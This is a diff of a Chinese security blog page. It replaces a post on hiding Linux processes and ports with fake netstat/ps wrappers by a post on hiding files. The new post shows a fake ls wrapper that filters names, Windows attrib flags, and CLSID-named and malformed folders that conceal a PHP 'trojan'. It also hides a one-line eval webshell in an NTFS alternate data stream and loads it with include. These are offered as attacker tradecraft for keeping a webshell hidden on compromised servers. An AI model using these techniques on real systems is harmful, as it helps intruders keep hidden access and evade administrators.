@@ -18,7 +18,7 @@
   <meta name="author" content="麻薯">
   <meta name="keywords" content="">
   
-  <title>linux进程隐匿 - Leticia&#39;s Blog</title>
+  <title>文件隐藏技巧 - Leticia&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
 
@@ -163,7 +163,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="linux进程隐匿">
+            <span class="h2" id="subtitle" title="文件隐藏技巧">
               
             </span>
 
@@ -173,8 +173,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2022-01-06 22:22" pubdate>
-        2022年1月6日 晚上
+      <time datetime="2022-01-21 00:23" pubdate>
+        2022年1月21日 凌晨
       </time>
     </span>
   
@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      243 字
+      720 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      3
+      8
        分钟
     </span>
   
@@ -225,56 +225,65 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">linux进程隐匿</h1>
+            <h1 style="display: none">文件隐藏技巧</h1>
             
             <div class="markdown-body">
-              <h2 id="netstat-伪装"><a href="#netstat-伪装" class="headerlink" title="netstat 伪装"></a>netstat 伪装</h2><p>先寻找netstat路径</p>
-<p>whereis netstat<br>which netstat</p>
-<p>得到</p>
-<p>/usr/bin/netstat</p>
-<p>创建<br>/usr/local/bin/netstat</p>
-<p>写入</p>
-<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"># !<span class="hljs-regexp">/bin/</span>bash<br><span class="hljs-regexp">/usr/</span>bin/netstat $@ | <span class="hljs-keyword">grep</span> -Ev <span class="hljs-string">&#x27;name|name|name&#x27;</span><br></code></pre></td></tr></table></figure>
+              <h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><p>linux中隐藏文件的方式是创建以.开头的文件名，但是由于shell中ls只要加入-a参数就可查看隐藏文件，一般加点并起不到什么作用，这里分享几种迷惑性的隐藏思路</p>
+<h3 id="创建…目录"><a href="#创建…目录" class="headerlink" title="创建…目录"></a>创建…目录</h3><p>由于每个目录都存在.和..两个目录</p>
+<p>其默认不使用-a参数也不会显示</p>
+<p>使用-a时会与.与..共同出现，有时会被人为忽略</p>
+<h3 id="更改ls"><a href="#更改ls" class="headerlink" title="更改ls"></a>更改ls</h3><p>修改ls程序屏蔽掉特定的字符串显示</p>
+<p>正常情况：</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/file_hiding/image01.png" srcset="/img/loading.gif" lazyload></p>
+<p>创建/usr/local/bin/ls</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"># !<span class="hljs-regexp">/bin/</span>bash<br><span class="hljs-regexp">/bin/</span>ls $@ | <span class="hljs-keyword">grep</span> -Ev <span class="hljs-string">&#x27;testfilename&#x27;</span><br></code></pre></td></tr></table></figure>
 
-<p>含有引号中每个|分割符中的选项都会被屏蔽</p>
-<p>可以是进程名、ip或端口</p>
-<p>然后赋予执行权限并开启新shell，则生效。</p>
-<p>例：</p>
-<p>如我们开启python httpserver在8000端口</p>
-<p>直接执行</p>
-<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">netstat</span> -ano | grep <span class="hljs-number">0.0.0.0</span><br></code></pre></td></tr></table></figure>
+<p>赋予执行权限</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">chmod +x <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>ls<br></code></pre></td></tr></table></figure>
 
-<p>得到结果中有开放的8000端口</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/linux_hiding/image01.png" srcset="/img/loading.gif" lazyload></p>
-<p>修改/usr/local/bin/netstat为</p>
-<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"># !<span class="hljs-regexp">/bin/</span>bash<br><span class="hljs-regexp">/usr/</span>bin/netstat $@ | <span class="hljs-keyword">grep</span> -Ev <span class="hljs-string">&#x27;8000&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>修改后情况：</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/file_hiding/image02.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><p>windows直接隐藏文件相对较好隐藏，但打开显示文件属性或使用命令行普通的方式就无效了，主要分享几种奇淫技巧</p>
+<h3 id="修改文件属性"><a href="#修改文件属性" class="headerlink" title="修改文件属性"></a>修改文件属性</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">attrib +s +<span class="hljs-selector-tag">a</span> +h +r <span class="hljs-selector-attr">[目标文件夹]</span><br></code></pre></td></tr></table></figure>
 
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">chmod +x <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>netstat<br></code></pre></td></tr></table></figure>
-
-<p>打开新shell执行</p>
-<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">netstat</span> -ano | grep <span class="hljs-number">0.0.0.0</span><br></code></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/linux_hiding/image02.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="ps伪装"><a href="#ps伪装" class="headerlink" title="ps伪装"></a>ps伪装</h2><p>以ps伪装隐藏ssh为例</p>
-<p>首先通过ps查看ssh进程</p>
-<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">ps</span> -ef | <span class="hljs-keyword">grep</span> ssh<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/linux_hiding/image03.png" srcset="/img/loading.gif" lazyload></p>
-<p>先寻找ps路径</p>
-<p>whereis ps<br>which ps</p>
-<p>得到</p>
-<p>/bin/ps</p>
-<p>创建</p>
-<p>/usr/local/bin/ps</p>
-<p>写入需要伪装的进程如ssh</p>
-<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"># !<span class="hljs-regexp">/bin/</span>bash<br><span class="hljs-regexp">/bin/</span>ps $@ | <span class="hljs-keyword">grep</span> -Ev <span class="hljs-string">&#x27;ssh&#x27;</span><br></code></pre></td></tr></table></figure>
-
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">chmod +x <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>ps<br></code></pre></td></tr></table></figure>
+<p>添加了系统文件属性、存档文件属性、只读文件属性和隐藏文件属性</p>
+<h3 id="系统代号"><a href="#系统代号" class="headerlink" title="系统代号"></a>系统代号</h3><p>新建文件夹temp，将木马文件a.php存入temp目录中，然后将文件夹temp名改为Computer.{20D04FE0-3AEA-1069-A2D8-08002B30309D}</p>
+<p>在windows中文件夹将变为我的电脑，双击打开将进入我的电脑页面，但webshell仍可使用<br><a target="_blank" rel="noopener" href="http://xx.xx.xx.xx/Computer.%7B20D04FE0-3AEA-1069-A2D8-08002B30309D%7D/a.php%E8%AE%BF%E9%97%AE">http://xx.xx.xx.xx/Computer.{20D04FE0-3AEA-1069-A2D8-08002B30309D}/a.php访问</a></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/file_hiding/image03.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/file_hiding/image04.png" srcset="/img/loading.gif" lazyload></p>
+<p>其他可用特殊代号</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs subunit">我的电脑.&#123;20D04FE0<span class="hljs-string">-3</span>AEA<span class="hljs-string">-1069</span>-A2D8<span class="hljs-string">-08002</span>B30309D&#125;<br>回收站.&#123;645ff040<span class="hljs-string">-5081</span><span class="hljs-string">-101</span>b<span class="hljs-string">-9</span>f08<span class="hljs-string">-00</span>aa002f954e&#125;<br>拔号网络.&#123;992CFFA0-F557<span class="hljs-string">-101</span>A<span class="hljs-string">-88</span>EC<span class="hljs-string">-00</span>DD010CCC48&#125;<br>打印机.&#123;2227a280<span class="hljs-string">-3</span>aea<span class="hljs-string">-1069</span>-a2de<span class="hljs-string">-08002</span>b30309d&#125;<br>控制面板.&#123;21ec2020<span class="hljs-string">-3</span>aea<span class="hljs-string">-1069</span>-a2dd<span class="hljs-string">-08002</span>b30309d&#125;<br>网上邻居.&#123;208D2C60<span class="hljs-string">-3</span>AEA<span class="hljs-string">-1069</span>-A2D7<span class="hljs-string">-08002</span>B30309D&#125;<br></code></pre></td></tr></table></figure>
 
 
+<h3 id="畸形目录"><a href="#畸形目录" class="headerlink" title="畸形目录"></a>畸形目录</h3><p>windows使用cmd创建如下畸形路径</p>
+<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">mkdir</span></span> a...\<br></code></pre></td></tr></table></figure>
 
-<p>新shell种使用ps命令，无法看到包含ssh关键字的进程</p>
-<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/linux_hiding/image04.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/file_hiding/image05.png" srcset="/img/loading.gif" lazyload></p>
+<p>在某些系统完全无法打开如win10</p>
+<p>在winserver2008可打开但查看不到内部内容</p>
+<p>在win7可以打开并查看内容，但无法直接使用图形化界面删除目录</p>
+<p>使用copy命令将木马拷贝到路径下</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">copy <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.php</span> <span class="hljs-selector-tag">a</span>...\<span class="hljs-selector-tag">a</span>.php<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/file_hiding/image06.png" srcset="/img/loading.gif" lazyload></p>
+<p>可使用webshell管理工具连接木马</p>
+<p>可使用如下命令删除目录</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">rd <span class="hljs-string">/s</span> <span class="hljs-string">/q</span> a.<span class="hljs-string">..</span>\<br></code></pre></td></tr></table></figure>
+
+<h3 id="利用-ADS-隐藏文件"><a href="#利用-ADS-隐藏文件" class="headerlink" title="利用 ADS 隐藏文件"></a>利用 ADS 隐藏文件</h3><p>NTFS交换数据流（Alternate　Data　Streams，简称 ADS）是 NTFS 磁盘格式的一个特性，在 NTFS文件系统下，每个文件都可以存在多个数据流。</p>
+<p>创建ADS隐藏文件</p>
+<p>在命令行，echo 一个数据流进去，比如 index 文件是正常文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> ^<span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-number">1</span>]);?^&gt; &gt; index.php:shell.jpg<br></code></pre></td></tr></table></figure>
+<p>这样就生成了一个在图形化资源管理器中不可见的 index.php:shell.jpg</p>
+<p>可使用命令行dir /r查看文件(仅dir查看不到)，使用notepad命令编辑文件</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">dir</span> /<span class="hljs-built_in">r</span><br>notepad index.php:shell.jpg<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/file_hiding/image07.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用文件包含使用其即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;index.php:shell.jpg&quot;</span>)<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/file_hiding/image08.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/788mROdIG0ncExDzBYcYow">https://mp.weixin.qq.com/s/788mROdIG0ncExDzBYcYow</a></p>
 
             </div>
             <hr>
@@ -309,18 +318,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2022/01/20/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">域渗透历史漏洞汇总</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2022/01/01/webshell%E6%BA%AF%E6%BA%90%E6%8E%92%E6%9F%A5%E4%B8%8E%E5%8F%8D%E5%88%B6/">
-                        <span class="hidden-mobile">webshell溯源排查与反制</span>
+                      <a href="/2022/01/20/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/">
+                        <span class="hidden-mobile">域渗透历史漏洞汇总</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
